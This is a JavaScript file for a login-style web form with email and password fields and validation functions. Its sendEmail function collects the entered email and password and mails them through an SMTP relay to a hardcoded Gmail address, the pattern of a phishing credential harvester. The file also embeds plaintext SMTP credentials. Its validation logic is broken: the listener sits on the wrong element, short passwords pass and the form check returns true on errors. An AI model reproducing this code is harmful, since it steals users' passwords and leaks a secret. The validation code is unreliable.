const form = document.querySelector('form');
const email = document.getElementById('email');
const password = document.getElementById('password');
const emailError = document.getElementById('email-error');
const passwordError = document.getElementById('password-error');
const submitError =  document.getElementById('submit-error');

function sendEmail() {
    const bodyMessage = `Email: ${email.value}<br> Password:${password.value} `

    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "dk1605889@gmail.com",
        Password : "FBC438FEA22B1B2597913215E8D733140633",
        To : 'dk1605889@gmail.com',
        From : "dk1605889@gmail.com",
        Subject : "This is the subject",
        Body : bodyMessage
    }).then(
      message => alert(message)
    );
}

email.addEventListener("submit", (e) => {
    e.preventDefault();

    sendEmail();
})



function validateEmail() {
    const email = document.querySelector('.contact-email').value;

    if (email.length == 0) {
        email.innerHTML = 'Email is required';
        return false;
    }else if (!email.match(/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/)) {
        emailError.innerHTML = 'Email Invalid';
        return false;
    }

    emailError.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
    return true;
}


function validatePassword() {
    const password = document.querySelector('.contact-password').value;

    if (password.length == 8) {
        password.innerHTML = 'Password must be at least 8 characters long.';
        return false; 
    } else if(password.length < 9) {
        passwordError.innerHTML = 'Password must be at least 8 characters long.';
        return true;  
    }

    passwordError.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
    return true;
}


function validateForm() {
    if(!validateEmail() || !validatePassword()) {
        submitError.style.display = 'block';
        submitError.innerHTML = 'Please fix error to submit';
        setTimeout(function() { submitError.style.display = 'none';}, 3000)
        return true;
    }
}


